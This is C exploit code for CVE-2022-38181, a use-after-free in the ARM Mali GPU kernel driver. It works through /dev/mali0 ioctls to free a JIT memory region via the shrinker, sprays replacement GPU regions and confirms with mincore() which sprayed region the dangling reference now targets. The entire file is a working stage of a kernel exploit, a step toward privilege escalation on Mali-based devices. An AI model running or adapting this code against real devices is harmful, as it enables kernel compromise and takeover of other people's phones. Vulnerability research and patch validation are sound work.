/* CVE-2022-38181 stage B-lite: prove the dangling jit_alloc[1] lands on a
 * sprayed replacement region, and identify WHICH sprayed region becomes the
 * victim (its own CPU mapping is zapped by kbase_jit_free).
 *
 * Detection: mincore() residency check per sprayed region. The victim's
 * pages lose residency when kbase_mem_shrink_cpu_mapping zaps them.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <poll.h>
#include <sched.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

typedef unsigned int __u32;
typedef unsigned short __u16;
typedef unsigned long long __u64;
typedef unsigned char __u8;

#include "mali_trona.h"

struct kbase_ioctl_mem_jit_init { __u64 va_pages; __u8 max_allocations; __u8 trim_level; __u8 padding[6]; };
#define KBASE_IOCTL_MEM_JIT_INIT _IOW(0x80, 14, struct kbase_ioctl_mem_jit_init)

struct kbase_ioctl_job_submit { __u64 addr; __u32 nr_atoms; __u32 stride; };
#define KBASE_IOCTL_JOB_SUBMIT _IOW(0x80, 2, struct kbase_ioctl_job_submit)

union kbase_ioctl_mem_query {
	struct { __u64 gpu_addr; __u64 query; } in;
	struct { __u64 value; } out;
};
#define KBASE_IOCTL_MEM_QUERY _IOWR(0x80, 6, union kbase_ioctl_mem_query)
#define KBASE_MEM_QUERY_VA_SIZE ((__u64)2)

struct base_dependency { __u8 atom_id; __u8 dependency_type; };
struct base_jd_atom_v2 {
	__u64 jc; __u64 udata[2]; __u64 extres_list;
	__u16 nr_extres; __u16 compat_core_req;
	struct base_dependency pre_dep[2];
	__u8 atom_number, prio, device_nr, padding;
	__u32 core_req;
};
struct base_jit_alloc_info {
	__u64 gpu_alloc_addr; __u64 va_pages; __u64 commit_pages; __u64 extent;
	__u8 id, bin_id, max_allocations, flags; __u8 padding[2]; __u16 usage_id;
};
struct base_jd_event_v2 { __u32 event_code; __u8 atom_number; __u8 _pad[3]; __u64 udata[2]; };

#define BASE_JD_REQ_SOFT_JOB       ((__u32)1 << 9)
#define BASE_JD_REQ_SOFT_JIT_ALLOC (BASE_JD_REQ_SOFT_JOB | 0x9)
#define BASE_JD_REQ_SOFT_JIT_FREE  (BASE_JD_REQ_SOFT_JOB | 0xa)

#define PAGE_SHIFT 12
#define REG_PAGES   64           /* 256KB per sprayed region */
#define N_SPRAY     8

static int fd;

static int submit_atom(__u32 core_req, __u64 jc, __u16 nr_extres, __u8 id)
{
	struct base_jd_atom_v2 atom;
	memset(&atom, 0, sizeof(atom));
	atom.jc = jc; atom.nr_extres = nr_extres;
	atom.atom_number = id; atom.core_req = core_req;
	struct kbase_ioctl_job_submit js = { (__u64)&atom, 1, sizeof(atom) };
	return ioctl(fd, KBASE_IOCTL_JOB_SUBMIT, &js);
}

static int wait_event(void)
{
	struct pollfd pfd = { fd, POLLIN, 0 };
	if (poll(&pfd, 1, 3000) <= 0) return -1;
	struct base_jd_event_v2 ev;
	if (read(fd, &ev, sizeof(ev)) < (int)sizeof(ev)) return -1;
	return ev.event_code;
}

static void *alloc_region(unsigned long pages)
{
	union kbase_ioctl_mem_alloc ma;
	memset(&ma, 0, sizeof(ma));
	ma.in.va_pages = ma.in.commit_pages = pages;
	ma.in.flags = BASE_MEM_SAME_VA | BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR |
		      BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR;
	if (ioctl(fd, KBASE_IOCTL_MEM_ALLOC, &ma) < 0) return NULL;
	return mmap(NULL, pages << PAGE_SHIFT, PROT_READ|PROT_WRITE, MAP_SHARED, fd, ma.out.gpu_va);
}

static void pressure(unsigned long mb)
{
	for (int i = 0; i < (int)(mb / 64); i++) {
		char *p = mmap(NULL, 64UL << 20, PROT_READ|PROT_WRITE,
			       MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
		if (p == MAP_FAILED) return;
		memset(p, 1, 64UL << 20);
	}
}

static int region_resident(void *va, unsigned long pages)
{
	unsigned long nbytes = pages << PAGE_SHIFT;
	unsigned char *vec = malloc(nbytes >> PAGE_SHIFT);
	if (mincore(va, nbytes, vec) < 0) { free(vec); return -1; }
	int res = 0;
	for (unsigned long i = 0; i < (nbytes >> PAGE_SHIFT); i++)
		res += vec[i] & 1;
	free(vec);
	return res;
}

int main(void)
{
	setvbuf(stdout, NULL, _IONBF, 0);
	cpu_set_t set;
	CPU_ZERO(&set); CPU_SET(0, &set);
	sched_setaffinity(0, sizeof(set), &set);

	struct kbase_ioctl_version_check vc = { 999, 999 };
	fd = open("/dev/mali0", O_RDWR);
	if (fd < 0) { perror("open"); return 1; }
	ioctl(fd, KBASE_IOCTL_VERSION_CHECK, &vc);
	struct kbase_ioctl_set_flags sf = { 0 };
	if (ioctl(fd, KBASE_IOCTL_SET_FLAGS, &sf) < 0) { perror("SF"); return 1; }
	if (mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, fd, BASE_MEM_MAP_TRACKING_HANDLE) == MAP_FAILED) {
		perror("track"); return 1;
	}
	struct kbase_ioctl_mem_jit_init ji = { 0 };
	ji.va_pages = 0x40000; ji.max_allocations = 8; ji.trim_level = 0;
	if (ioctl(fd, KBASE_IOCTL_MEM_JIT_INIT, &ji) < 0) { perror("JIT_INIT"); return 1; }
	printf("[*] init done\n");

	void *wb = alloc_region(1);
	if (!wb) { perror("wb"); return 1; }
	*(__u64 *)wb = 0;

	struct base_jit_alloc_info info;
	memset(&info, 0, sizeof(info));
	info.gpu_alloc_addr = (__u64)wb;
	info.va_pages = info.commit_pages = info.extent = 4096;
	info.id = 1; info.max_allocations = 8;

	if (submit_atom(BASE_JD_REQ_SOFT_JIT_ALLOC, (__u64)&info, 1, 1) < 0) { perror("JIT_ALLOC"); return 1; }
	wait_event();
	__u64 jit_va = *(__u64 *)wb;
	printf("[*] jit_va = 0x%llx\n", jit_va);
	if (!jit_va) return 1;

	struct kbase_ioctl_mem_flags_change fc;
	fc.gpu_va = jit_va;
	fc.mask   = BASE_MEM_FLAGS_MODIFIABLE | BASE_MEM_DONT_NEED;
	fc.flags  = BASE_MEM_FLAGS_MODIFIABLE | BASE_MEM_DONT_NEED;
	if (ioctl(fd, KBASE_IOCTL_MEM_FLAGS_CHANGE, &fc) < 0) { perror("FLAGS_CHANGE"); return 1; }
	printf("[*] JIT region marked DONT_NEED\n");

	union kbase_ioctl_mem_query q;
	int freed = 0;
	for (int r = 0; r < 30 && !freed; r++) {
		pressure(64);
		memset(&q, 0, sizeof(q));
		q.in.gpu_addr = jit_va; q.in.query = KBASE_MEM_QUERY_VA_SIZE;
		if (ioctl(fd, KBASE_IOCTL_MEM_QUERY, &q) < 0) freed = 1;
	}
	if (!freed) { printf("[-] shrinker never fired\n"); return 1; }
	printf("[+] shrinker reclaimed the evictable JIT region\n");
	sleep(5);

	void *sp[N_SPRAY];
	printf("[*] spraying %d replacement regions\n", N_SPRAY);
	for (int i = 0; i < N_SPRAY; i++) {
		sp[i] = alloc_region(REG_PAGES);
		if (!sp[i]) { perror("spray"); return 1; }
		memset(sp[i], 0xab, REG_PAGES << PAGE_SHIFT);  /* fault them in */
	}
	/* baseline residency */
	printf("[*] baseline residency: ");
	for (int i = 0; i < N_SPRAY; i++) printf("%d ", region_resident(sp[i], REG_PAGES));
	printf("\n");

	__u8 ids[1] = { 1 };
	if (submit_atom(BASE_JD_REQ_SOFT_JIT_FREE, (__u64)ids, 1, 2) < 0) { perror("JIT_FREE"); return 1; }
	int ev = wait_event();
	printf("[*] JIT_FREE done, event=0x%x\n", ev);
	sleep(1);

	printf("[*] post-free residency: ");
	int victim = -1;
	for (int i = 0; i < N_SPRAY; i++) {
		int res = region_resident(sp[i], REG_PAGES);
		printf("%d ", res);
		if (res == 0) victim = i;   /* zapped = the dangling-target */
	}
	printf("\n");
	if (victim >= 0)
		printf("[+] REPLACEMENT CONFIRMED: sprayed region #%d took the freed JIT slot and was thin-freed\n", victim);
	else
		printf("[-] no zapped region (dangling ref may not have been replaced)\n");
	return 0;
}
